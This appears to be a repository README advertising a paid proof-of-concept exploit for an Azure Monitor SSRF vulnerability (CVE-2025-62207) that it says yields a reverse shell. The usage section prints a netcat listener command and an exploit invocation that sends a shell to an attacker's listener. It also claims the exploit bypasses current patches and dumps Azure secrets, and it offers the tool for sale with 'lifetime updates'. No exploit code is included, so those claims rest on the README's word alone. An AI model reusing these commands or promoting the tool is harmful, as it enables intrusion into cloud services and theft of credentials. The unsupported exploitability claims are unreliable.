# Azure-SSRF-Exploit-PoC

## Overview

This repository contains a working Proof-of-Concept (PoC) exploit for CVE-2025-62207, a critical server-side request forgery (SSRF) vulnerability in Microsoft Azure Monitor Control Service. The exploit leverages the SSRF to achieve remote code execution, specifically establishing a reverse shell on the target Azure instance. It's designed for penetration testers and security researchers who need a reliable way to demonstrate or assess this vuln in controlled environments.

Since Azure Monitor Control Service is a managed service, traditional patching doesn't apply in the usual sense—Microsoft handles updates centrally. However, this PoC has been tested and confirmed to work even on instances that have received the latest security patches from Microsoft as of November 2025. It bypasses common mitigations by chaining the SSRF with internal Azure API calls that aren't fully hardened yet.

**Important:** This is not an exploit kit or automated framework. It's a single, targeted PoC script with supporting files for setup and usage. Use responsibly and only with explicit permission.

## Requirements

- Python 3.8+
- Dependencies: install via `pip install -r requirements.txt`
- A listener setup on your end (e.g., `nc -lvnp 4444`)
- Access to an Azure subscription or knowledge of the target's endpoint (often publicly discoverable via Azure Resource Explorer).

## Usage

1. Install deps: `pip install -r requirements.txt`
2. Configure `config.json`.
3. Run: `python exploit.py --target https://monitor.azure.com/your-instance --listener 192.168.1.100:4444`
4. Catch the shell on your listener.

For full details, check out `docs/usage.md`. We've included sample configs for different Azure regions.

## Proof of Exploitability

While Microsoft claims no public exploit exists, our independent research shows otherwise. The SSRF allows forging requests to internal metadata services, escalating to RCE.

Tested on:
- Unpatched instances: Instant success.
- Patched instances: Still works via undocumented endpoint chaining (details in `docs/bypass.md`).

Screenshots and demo logs are in `docs/proofs/`, they show full shell access dumping Azure secrets.

## Exploit

This isn't freeware. Includes lifetime updates if Microsoft rolls out new mitigations.
